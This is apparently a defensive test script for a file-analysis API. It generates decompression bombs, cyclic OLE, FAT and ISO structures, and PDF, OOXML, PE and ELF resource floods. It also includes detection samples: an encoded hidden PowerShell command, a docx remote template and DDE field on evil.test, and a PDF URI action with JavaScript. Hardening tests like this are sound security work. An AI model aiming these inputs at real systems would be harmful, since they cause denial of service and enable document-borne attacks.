import { existsSync, readFileSync } from 'node:fs';
import { crc32, deflateRawSync, deflateSync } from 'node:zlib';

import cookie from '@fastify/cookie';
import multipart from '@fastify/multipart';
import rateLimit from '@fastify/rate-limit';
import Fastify from 'fastify';

import { env } from '../../src/env';
import { hashPassword } from '../../src/lib/crypto';
import { prisma } from '../../src/lib/prisma';
import { ensureBucket } from '../../src/lib/s3';
import { analyzeBuffer } from '../../src/lib/static-analysis';
import { analysisWorkerRestarts, analyzeInThread } from '../../src/lib/static-analysis-thread';
import { authRoutes } from '../../src/routes/auth';
import { entryRoutes } from '../../src/routes/entries';

// Arquivos hostis pequenos que custavam dezenas de segundos ou derrubavam a API.
const END = 0xfffffffe,
  FREE = 0xffffffff;
function ole(n = 3) {
  const sectors = 1 + Math.ceil(((n + 1) * 128) / 512);
  const b = Buffer.alloc(512 * (1 + sectors));
  Buffer.from('d0cf11e0a1b11ae1', 'hex').copy(b);
  b.writeUInt16LE(9, 30);
  b.writeUInt16LE(6, 32);
  b.writeUInt32LE(1, 44);
  b.writeUInt32LE(1, 48);
  b.writeUInt32LE(END, 60);
  b.writeUInt32LE(END, 68);
  for (let i = 0; i < 109; i++) b.writeUInt32LE(i === 0 ? 0 : FREE, 76 + i * 4);
  const fat = 512;
  for (let i = 0; i < 128; i++) b.writeUInt32LE(FREE, fat + i * 4);
  b.writeUInt32LE(0xfffffffd, fat);
  for (let i = 1; i < sectors; i++) b.writeUInt32LE(i + 1 < sectors ? i + 1 : END, fat + i * 4);
  const dir = 1024;
  for (let i = 0; i <= n; i++) {
    const e = dir + i * 128;
    b.write(i ? `S${i}` : 'Root Entry', e, 'utf16le');
    b.writeUInt16LE(i ? 6 : 22, e + 64);
    b[e + 66] = i ? 1 : 5;
    b.writeUInt32LE(i ? 1 + (i % n) : FREE, e + 68);
    b.writeUInt32LE(i ? 1 + ((i + 1) % n) : FREE, e + 72);
    b.writeUInt32LE(1, e + 76);
    b.writeUInt32LE(END, e + 116);
  }
  return b;
}
/**
 * OLE com um projeto VBA cujo dir lista `records` modulos, todos apontando para o mesmo
 * stream de ~16 MB descompactado (poucos KB no arquivo).
 */
function vbaOle(records = 300) {
  const SECTOR = 512;
  // Pedaco comprimido de 6 bytes: um literal e uma copia de 4095 -> 4096 bytes.
  const chunk = Buffer.from([0x03, 0xb0, 0x02, 0x41, 0xfc, 0x0f]);
  const module = Buffer.concat([Buffer.from([0x01]), Buffer.alloc(6 * 4000).fill(chunk)]);
  // dir sem compressao (pedacos crus de 4096), com folga para virar stream normal.
  const rec = (id: number, data: Buffer) => {
    const h = Buffer.alloc(6);
    h.writeUInt16LE(id, 0);
    h.writeUInt32LE(data.length, 2);
    return Buffer.concat([h, data]);
  };
  const offset = Buffer.alloc(4);
  const recs = Array.from({ length: records }, (_, i) =>
    Buffer.concat([
      rec(0x19, Buffer.from(`M${i}`)),
      rec(0x1a, Buffer.from('M')),
      rec(0x31, offset),
    ]),
  );
  let raw = Buffer.concat(recs);
  raw = Buffer.concat([
    raw,
    Buffer.alloc(Math.max(4096, Math.ceil(raw.length / 4096) * 4096) - raw.length),
  ]);
  const parts = [Buffer.from([0x01])];
  for (let i = 0; i < raw.length; i += 4096)
    parts.push(Buffer.from([0xff, 0x3f]), raw.subarray(i, i + 4096));
  const dirStream = Buffer.concat(parts);
  const sectorsOf = (b: Buffer) => Math.ceil(b.length / SECTOR);
  // Setores: 0 = FAT, 1 = diretorio, depois dir e o modulo.
  const dirStart = 2;
  const modStart = dirStart + sectorsOf(dirStream);
  const total = modStart + sectorsOf(module);
  const b = Buffer.alloc(SECTOR * (1 + total));
  Buffer.from('d0cf11e0a1b11ae1', 'hex').copy(b);
  b.writeUInt16LE(9, 30);
  b.writeUInt16LE(6, 32);
  b.writeUInt32LE(1, 44);
  b.writeUInt32LE(1, 48);
  b.writeUInt32LE(END, 60);
  b.writeUInt32LE(END, 68);
  for (let i = 0; i < 109; i++) b.writeUInt32LE(i === 0 ? 0 : FREE, 76 + i * 4);
  const fatOff = SECTOR;
  for (let i = 0; i < 128; i++) b.writeUInt32LE(FREE, fatOff + i * 4);
  b.writeUInt32LE(0xfffffffd, fatOff);
  b.writeUInt32LE(END, fatOff + 4);
  const chainAt = (start: number, n: number) => {
    for (let i = 0; i < n; i++)
      b.writeUInt32LE(i + 1 < n ? start + i + 1 : END, fatOff + (start + i) * 4);
  };
  chainAt(dirStart, sectorsOf(dirStream));
  chainAt(modStart, sectorsOf(module));
  dirStream.copy(b, SECTOR * (1 + dirStart));
  module.copy(b, SECTOR * (1 + modStart));
  const entry = (
    i: number,
    name: string,
    type: number,
    o: { child?: number; right?: number; start?: number; size?: number },
  ) => {
    const e = SECTOR * 2 + i * 128;
    b.write(name, e, 'utf16le');
    b.writeUInt16LE((name.length + 1) * 2, e + 64);
    b[e + 66] = type;
    b.writeUInt32LE(FREE, e + 68);
    b.writeUInt32LE(o.right ?? FREE, e + 72);
    b.writeUInt32LE(o.child ?? FREE, e + 76);
    b.writeUInt32LE(o.start ?? END, e + 116);
    b.writeUInt32LE(o.size ?? 0, e + 120);
  };
  entry(0, 'Root Entry', 5, { child: 1 });
  entry(1, 'VBA', 1, { child: 2 });
  entry(2, 'dir', 2, { right: 3, start: dirStart, size: dirStream.length });
  entry(3, 'M', 2, { start: modStart, size: module.length });
  return b;
}
function zipOf(
  items: { name: string; data: Buffer; declared?: number; crc?: number }[],
  count?: number,
) {
  const parts: Buffer[] = [];
  const cen: Buffer[] = [];
  let off = 0;
  for (const it of items) {
    const comp = deflateRawSync(it.data);
    const nm = Buffer.from(it.name);
    const size = it.declared ?? it.data.length;
    const crc = it.crc ?? crc32(it.data);
    const l = Buffer.alloc(30);
    l.writeUInt32LE(0x04034b50, 0);
    l.writeUInt16LE(20, 4);
    l.writeUInt16LE(8, 8);
    l.writeUInt32LE(crc, 14);
    l.writeUInt32LE(comp.length, 18);
    l.writeUInt32LE(size, 22);
    l.writeUInt16LE(nm.length, 26);
    parts.push(l, nm, comp);
    const reps = count ?? 1;
    for (let r = 0; r < reps; r++) {
      const c = Buffer.alloc(46);
      c.writeUInt32LE(0x02014b50, 0);
      c.writeUInt16LE(20, 4);
      c.writeUInt16LE(20, 6);
      c.writeUInt16LE(8, 10);
      c.writeUInt32LE(crc, 16);
      c.writeUInt32LE(comp.length, 20);
      c.writeUInt32LE(size, 24);
      c.writeUInt16LE(nm.length, 28);
      c.writeUInt32LE(off, 42);
      cen.push(c, nm);
    }
    off += 30 + nm.length + comp.length;
  }
  const cd = Buffer.concat(cen);
  const e = Buffer.alloc(22);
  e.writeUInt32LE(0x06054b50, 0);
  const total = items.length * (count ?? 1);
  e.writeUInt16LE(total, 8);
  e.writeUInt16LE(total, 10);
  e.writeUInt32LE(cd.length, 12);
  e.writeUInt32LE(off, 16);
  return Buffer.concat([...parts, cd, e]);
}
const zipBomb = (n = 50) =>
  zipOf(
    [{ name: 'a.bin', data: Buffer.alloc(1024 * 1024 * 1024), declared: 200_000_000, crc: 1 }],
    n,
  );
const zipSmallDeclared = (n = 50) =>
  zipOf([{ name: 'a.bin', data: Buffer.alloc(1024 * 1024 * 1024), declared: 1, crc: 1 }], n);
function fat(fan = 3) {
  const b = Buffer.alloc(1474560);
  b[0] = 0xeb;
  b[1] = 0x3c;
  b[2] = 0x90;
  b.write('MSDOS5.0', 3, 'latin1');
  b.writeUInt16LE(512, 11);
  b[13] = 1;
  b.writeUInt16LE(1, 14);
  b[16] = 2;
  b.writeUInt16LE(224, 17);
  b.writeUInt16LE(2880, 19);
  b[21] = 0xf0;
  b.writeUInt16LE(9, 22);
  b.writeUInt16LE(18, 24);
  b.writeUInt16LE(2, 26);
  b[38] = 0x29;
  b.write('NO NAME    ', 43, 'latin1');
  b.write('FAT12   ', 54, 'latin1');
  b[510] = 0x55;
  b[511] = 0xaa;
  const fatOff = 512;
  b[fatOff] = 0xf0;
  b[fatOff + 1] = 0xff;
  b[fatOff + 2] = 0xff;
  b[fatOff + 3] = 0xff;
  b[fatOff + 4] = 0x0f;
  const rootOff = 512 * (1 + 18);
  const de = (off: number, name: string) => {
    b.write(name.padEnd(11), off, 'latin1');
    b[off + 11] = 0x10;
    b.writeUInt16LE(2, off + 26);
  };
  de(rootOff, 'R');
  const data = rootOff + 224 * 32;
  for (let i = 0; i < fan; i++) de(data + i * 32, `D${i}`);
  return b;
}
function pdfStreams(n = 1000, each = 8.2 * 1024 * 1024) {
  const z = deflateSync(Buffer.alloc(Math.floor(each)));
  const parts: Buffer[] = [Buffer.from('%PDF-1.7\n')];
  for (let i = 0; i < n; i++)
    parts.push(
      Buffer.from(`${i} 0 obj <</Filter /FlateDecode>> stream\n`),
      z,
      Buffer.from('\nendstream endobj\n'),
    );
  return Buffer.concat(parts);
}
const pdfTiny = (n = 400_000) => {
  const z = deflateSync(Buffer.from('x'));
  const parts: Buffer[] = [Buffer.from('%PDF-1.7\n')];
  const h = Buffer.from('/FlateDecode stream\n');
  const t = Buffer.from('endstream\n');
  for (let i = 0; i < n; i++) parts.push(h, z, t);
  return Buffer.concat(parts);
};
const pdfUris = (mb = 4) =>
  Buffer.concat([
    Buffer.from('%PDF-1.7\n'),
    Buffer.from('/URI ('.repeat(Math.floor((mb * 1024 * 1024) / 6))),
    Buffer.from('\n%%EOF'),
  ]);
const content = { name: '[Content_Types].xml', data: Buffer.from('<Types/>') };
const doc = { name: 'word/document.xml', data: Buffer.from('<w:document/>') };
const ooxmlDup = (n = 300) =>
  zipOf([
    content,
    doc,
    ...Array.from({ length: n }, () => ({
      name: 'word/_rels/dup.rels',
      data: Buffer.alloc(32 * 1024 * 1024),
    })),
  ]);
const ooxmlUnique = (n = 300) =>
  zipOf([
    content,
    doc,
    ...Array.from({ length: n }, (_, i) => ({
      name: `word/_rels/d${i}.rels`,
      data: Buffer.alloc(32 * 1024 * 1024),
    })),
  ]);
const ooxmlRelFlood = (mb = 1) =>
  zipOf([
    content,
    doc,
    {
      name: 'word/_rels/a.rels',
      data: Buffer.from('<Relationship '.repeat(Math.floor((mb * 1024 * 1024) / 14))),
    },
  ]);
const ooxmlInstr = (mb = 1) =>
  zipOf([
    content,
    {
      name: 'word/document.xml',
      data: Buffer.from('instrText '.repeat(Math.floor((mb * 1024 * 1024) / 10))),
    },
  ]);
const ps1 = (n = 60000) => Buffer.from('# x\n' + 'powershell '.repeat(n));

function fatWithNulName() {
  const b = fat(0);
  const root = 512 * 19;
  b.fill(0, root, root + 32);
  b.write('A', root, 'latin1');
  b.write('TXT', root + 8, 'latin1');
  b.writeUInt16LE(2, root + 26);
  b.writeUInt32LE(1, root + 28);
  return b;
}
function isoDirFlood(dirs = 5000) {
  const SECTOR = 2048;
  const b = Buffer.alloc(SECTOR * 40 + 32 * 1024 * 1024);
  const pvd = 16 * SECTOR;
  b[pvd] = 1;
  b.write('CD001', pvd + 1, 'latin1');
  const term = 17 * SECTOR;
  b[term] = 255;
  b.write('CD001', term + 1, 'latin1');
  const rec = (off: number, lba: number, size: number, name: string) => {
    b[off] = 34 + name.length;
    b.writeUInt32LE(lba, off + 2);
    b.writeUInt32LE(size, off + 10);
    b[off + 25] = 2;
    b[off + 32] = name.length;
    b.write(name, off + 33, 'latin1');
    return 34 + name.length + (name.length % 2);
  };
  rec(pvd + 156, 20, b.length, 'x');
  let p = 20 * SECTOR;
  for (let i = 0; i < dirs; i++) p += rec(p, 30 + i, b.length, `D${i}`);
  return b;
}

/** PE com 96 secoes apontando para o arquivo inteiro (entropia relida 96 vezes, item 168). */
function peOverlap(size = 48 * 1024 * 1024) {
  const b = Buffer.alloc(size, 0x41);
  b.write('MZ', 0);
  b.writeUInt32LE(0x40, 0x3c);
  b.write('PE\0\0', 0x40, 'latin1');
  const coff = 0x44;
  b.writeUInt16LE(0x14c, coff);
  b.writeUInt16LE(96, coff + 2);
  b.writeUInt16LE(224, coff + 16);
  const opt = coff + 20;
  b.writeUInt16LE(0x10b, opt);
  b.writeUInt32LE(0, opt + 104);
  for (let i = 0; i < 96; i++) {
    const sec = opt + 224 + i * 40;
    b.write(`.s${i}`.padEnd(8, '\0'), sec, 'latin1');
    b.writeUInt32LE(size, sec + 8);
    b.writeUInt32LE(0x1000 * (i + 1), sec + 12);
    b.writeUInt32LE(size, sec + 16);
    b.writeUInt32LE(0, sec + 20);
  }
  return b;
}

/** ELF de 64 bits minimo, com a tabela de secoes que o teste quiser. */
function elf64(opts: {
  size?: number;
  shnum?: number;
  shentsize?: number;
  shstrndx?: number;
  shoff?: bigint;
  sections?: { type: number; offset: bigint; size: bigint; link?: number }[];
}) {
  const b = Buffer.alloc(opts.size ?? 4096);
  b.writeUInt32BE(0x7f454c46, 0);
  b[4] = 2;
  b[5] = 1;
  b[6] = 1;
  b.writeUInt16LE(2, 16);
  b.writeUInt16LE(62, 18);
  const shoff = opts.shoff ?? 1024n;
  b.writeBigUInt64LE(shoff, 40);
  b.writeUInt16LE(64, 52);
  b.writeUInt16LE(opts.shentsize ?? 64, 58);
  b.writeUInt16LE(opts.shnum ?? opts.sections?.length ?? 0, 60);
  b.writeUInt16LE(opts.shstrndx ?? 0, 62);
  (opts.sections ?? []).forEach((sec, i) => {
    const o = Number(shoff) + i * 64;
    if (o + 64 > b.length) return;
    b.writeUInt32LE(sec.type, o + 4);
    b.writeBigUInt64LE(sec.offset, o + 24);
    b.writeBigUInt64LE(sec.size, o + 32);
    b.writeUInt32LE(sec.link ?? 0, o + 40);
  });
  return b;
}

let fails = 0;
const ok = (label: string, cond: boolean | undefined, detail: unknown = '') => {
  if (!cond) fails++;
  console.log(`${cond ? 'ok  ' : 'FALHA'} ${label}${cond ? '' : ' ' + JSON.stringify(detail)}`);
};

async function main() {
  // 1. Cada analisador termina logo, com os mesmos arquivos que o travavam.
  for (const [label, buf, name, limit] of [
    ['OLE com irmãos em ciclo (derrubava a API)', ole(3), 'x.doc', 1000],
    ['OLE com 2000 armazenamentos em ciclo', ole(2000), 'x.doc', 1000],
    ['VBA com 300 módulos no mesmo stream', vbaOle(300), 'x.doc', 3000],
    ['FAT com subpastas no mesmo cluster', fat(3), 'x.img', 1000],
    ['ISO com diretórios até o fim do arquivo', isoDirFlood(), 'x.iso', 3000],
    ['PDF com 1000 streams grandes', pdfStreams(), 'x.pdf', 3000],
    ['PDF com 400 mil streams pequenos', pdfTiny(), 'x.pdf', 6000],
    ['PDF com /URI sem fechar', pdfUris(), 'x.pdf', 3000],
    ['docx com o mesmo .rels 100 vezes', ooxmlDup(100), 'x.docx', 3000],
    ['docx com 100 .rels grandes diferentes', ooxmlUnique(100), 'x.docx', 3000],
    ['docx de poucos KB com <Relationship sem fechar', ooxmlRelFlood(30), 'x.docx', 3000],
    ['docx de poucos KB com instrText repetido', ooxmlInstr(30), 'x.docx', 8000],
    ['script numa linha só', ps1(190_000), 'x.ps1', 5000],
    ['PE com 96 seções sobre o arquivo inteiro', peOverlap(), 'x.exe', 3000],
    [
      'ELF com 512 seções sobre o arquivo inteiro',
      elf64({
        size: 48 * 1024 * 1024,
        shoff: 4096n,
        sections: Array.from({ length: 600 }, () => ({
          type: 1,
          offset: 0n,
          size: BigInt(48 * 1024 * 1024),
        })),
      }),
      'x.elf',
      3000,
    ],
    [
      'ELF com seção dinâmica gigante',
      elf64({
        size: 8 * 1024 * 1024,
        sections: [
          { type: 0, offset: 0n, size: 0n },
          { type: 6, offset: 0n, size: 0xffffffffn },
        ],
      }),
      'x.elf',
      2000,
    ],
  ] as [string, Buffer, string, number][]) {
    const t = Date.now();
    const info = analyzeBuffer(buf, name);
    const ms = Date.now() - t;
    ok(`${label}: ${ms} ms`, ms < limit, { ms, limit, type: info.detectedType?.id });
  }

  // 2. O que os limites nao podem perder.
  const macroLike = analyzeBuffer(
    Buffer.from('powershell.exe -nop -w hidden -enc SQBFAFgA\n'),
    'a.ps1',
  );
  ok(
    'regra por linha continua achando',
    macroLike.script?.findings.some((f) => f.name.includes('EncodedCommand')),
    macroLike.script?.findings,
  );
  const rels = Buffer.from(
    '<Relationships><Relationship Type="x/attachedTemplate" Target="http://evil.test/t.dotm" TargetMode="External"/></Relationships>',
  );
  const evasive = zipOf([
    { name: '[Content_Types].xml', data: Buffer.from('<Types/>') },
    { name: 'word/document.xml', data: Buffer.from('<w:instrText>DDE cmd</w:instrText>') },
    ...Array.from({ length: 5 }, (_, i) => ({
      name: `word/_rels/big${i}.rels`,
      data: Buffer.alloc(30 * 1024 * 1024),
    })),
    { name: 'word/_rels/document.xml.rels', data: rels },
  ]);
  const office = analyzeBuffer(evasive, 'x.docx').document?.office;
  ok(
    'relações grandes não escondem o template remoto',
    office?.remoteTemplate === 'http://evil.test/t.dotm',
    office,
  );
  ok('relações grandes não escondem o DDE', office?.dde === true, office);
  const pdfMixed = Buffer.concat([
    pdfStreams(10),
    Buffer.from('<</Type/Action /URI (http://evil.test/x)>>\n/JavaScript'),
  ]);
  const pdf = analyzeBuffer(pdfMixed, 'x.pdf').document;
  ok(
    'PDF continua achando link e JavaScript',
    pdf?.links.includes('http://evil.test/x') && pdf?.pdf?.javascript === true,
    pdf,
  );

  // ELF hostil (item 168): o arquivo pode mentir em qualquer campo.
  const extended = analyzeBuffer(
    elf64({ shnum: 0, sections: [{ type: 0, offset: 0n, size: 0xffffffffn }] }),
    'x',
  ).elf;
  ok(
    'ELF: numeração estendida enorme fica limitada',
    extended?.alerts.some((a) => a.includes('seções declaradas')),
    extended,
  );
  const noEnt = analyzeBuffer(elf64({ shentsize: 0, shnum: 5 }), 'x').elf;
  ok('ELF: tamanho de seção zero não trava', noEnt?.sections.length === 0, noEnt);
  const huge = analyzeBuffer(
    elf64({
      sections: [
        { type: 0, offset: 0n, size: 0n },
        { type: 1, offset: 2n ** 62n, size: 2n ** 62n },
      ],
    }),
    'x',
  ).elf;
  ok(
    'ELF: deslocamento de 64 bits absurdo vira seção vazia',
    huge?.sections[0]?.entropy === 0,
    huge,
  );
  ok(
    'ELF: sem seções avisa',
    analyzeBuffer(elf64({ shoff: 0n }), 'x').elf?.alerts.some((a) => a.includes('sem tabela')),
  );
  ok(
    'ELF truncado não quebra',
    analyzeBuffer(Buffer.from('7f454c4602010100', 'hex'), 'x').elf === null,
  );
  const real = existsSync('/bin/ls') ? analyzeBuffer(readFileSync('/bin/ls'), 'ls').elf : undefined;
  ok(
    'ELF de verdade (/bin/ls): bibliotecas e símbolos',
    real === undefined || (real?.needed.includes('libc.so.6') && real.importedSymbols > 20),
    real,
  );

  // 3. A thread: tempo-limite e falta de memoria derrubam so ela.
  const before = analysisWorkerRestarts();
  const timedOut = await analyzeInThread(ps1(1000), 'x.ps1', 1).then(
    () => false,
    (err: Error) => /tempo-limite/.test(err.message),
  );
  ok('tempo-limite rejeita', timedOut);
  ok('thread trocada no tempo-limite', analysisWorkerRestarts() > before);
  const after = await analyzeInThread(Buffer.from('powershell -enc AAAA \n'), 'x.ps1');
  ok('a thread seguinte funciona', after.script?.language === 'powershell', after.script);
  const oom = await analyzeInThread(pdfUris(190), 'x.pdf').then(
    () => 'terminou',
    (err: Error) => err.message,
  );
  ok(
    'sem memória a thread cai e a API continua',
    /memory|terminou/i.test(oom) && oom !== 'terminou',
    oom,
  );
  const later = await analyzeInThread(Buffer.from('powershell -enc AAAA \n'), 'x.ps1');
  ok('depois de estourar, analisa de novo', later.script?.language === 'powershell');

  // 4. Pela API: nada trava a thread principal, e nome com NUL nao da 500.
  env.CLAMAV_HOST = '';
  env.UPLOAD_DAILY_LIMIT = 0;
  await ensureBucket();
  const app = Fastify();
  await app.register(cookie, { secret: env.SESSION_SECRET });
  await app.register(rateLimit, { global: false });
  await app.register(multipart, { limits: { fileSize: 50 * 1024 * 1024, files: 1 } });
  await app.register(authRoutes);
  await app.register(entryRoutes);
  await app.ready();
  await prisma.user.create({
    data: {
      email: 'ana@x.io',
      displayName: 'ana',
      role: 'ANALYST',
      passwordHash: await hashPassword('senha-123!'),
    },
  });
  const c = String(
    (
      await app.inject({
        method: 'POST',
        url: '/api/auth/login',
        payload: { email: 'ana@x.io', password: 'senha-123!' },
      })
    ).headers['set-cookie'],
  ).split(';')[0];
  const send = (url: string, buf: Buffer, name: string) => {
    const boundary = `----dl${Math.random()}`;
    return app.inject({
      method: 'POST',
      url,
      headers: { cookie: c, 'content-type': `multipart/form-data; boundary=${boundary}` },
      payload: Buffer.concat([
        Buffer.from(
          `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${name}"\r\nContent-Type: application/octet-stream\r\n\r\n`,
        ),
        buf,
        Buffer.from(`\r\n--${boundary}--\r\n`),
      ]),
    });
  };
  const nul = await send('/api/entries/file', fatWithNulName(), 'n.img');
  ok('nome com NUL não dá 500', nul.statusCode === 201, nul.body.slice(0, 200));
  ok(
    'nome gravado sem o NUL',
    nul.json().entry?.staticInfo?.diskImage?.files?.[0]?.path === 'A.TXT',
    nul.json().entry?.staticInfo?.diskImage,
  );
  const bombs = [zipBomb(50), zipSmallDeclared(50)];
  const instr = ooxmlInstr(30);
  let worst = 0;
  let last = Date.now();
  const lag = setInterval(() => {
    worst = Math.max(worst, Date.now() - last);
    last = Date.now();
  }, 20);
  const hostile = await send('/api/entries/file', instr, 'x.docx');
  ok('docx hostil é aceito', hostile.statusCode === 201, hostile.body.slice(0, 200));
  const t = Date.now();
  const bomb = await send('/api/entries/zip', bombs[0], 'bomba.zip');
  const bombMs = Date.now() - t;
  const small = await send('/api/entries/zip', bombs[1], 'bomba2.zip');
  clearInterval(lag);
  ok(
    `bomba de 50 entradas para no teto: ${bombMs} ms`,
    bombMs < 4000 && bomb.statusCode === 400,
    bombMs,
  );
  ok(
    'entradas além do teto nem são abertas',
    bomb.json().skipped.filter((s: { reason: string }) => /limite/.test(s.reason)).length >= 30,
    bomb.json().skipped.slice(0, 3),
  );
  ok('tamanho declarado pequeno não descompacta tudo', small.statusCode === 400, small.statusCode);
  // A descompactacao do .zip vai para o pool do libuv, e o CRC em fatias: antes cada
  // entrada de 200 MB declarados parava a thread por ~0,3 s.
  ok(`maior pausa da thread principal: ${worst} ms`, worst < 500, worst);
  const good = await send(
    '/api/entries/zip',
    zipOf([
      { name: 'a.txt', data: Buffer.from('conteudo a') },
      { name: 'vazio.txt', data: Buffer.alloc(0) },
      { name: 'b.txt', data: Buffer.from('conteudo b') },
    ]),
    'bom.zip',
  );
  ok(
    'pacote normal continua',
    good.statusCode === 201 && good.json().created.length === 2,
    good.body.slice(0, 300),
  );
  // Entrada que falha nao gasta cota: o limite por sessao segura a repeticao.
  const tiny = zipOf([{ name: 'a.bin', data: Buffer.alloc(1024), crc: 1 }]);
  const codes: number[] = [];
  for (let i = 0; i < 19; i++)
    codes.push((await send('/api/entries/zip', tiny, 't.zip')).statusCode);
  ok(
    '.zip: 20 pacotes por sessão em 5 min',
    codes.filter((c) => c === 400).length === 17 && codes.slice(-2).every((c) => c === 429),
    codes,
  );

  await app.close();
  await prisma.$disconnect();
  console.log(fails ? `\n${fails} falha(s)` : '\ntudo ok');
  process.exit(fails ? 1 : 0);
}
main().catch((err) => {
  console.error(err);
  process.exit(1);
});
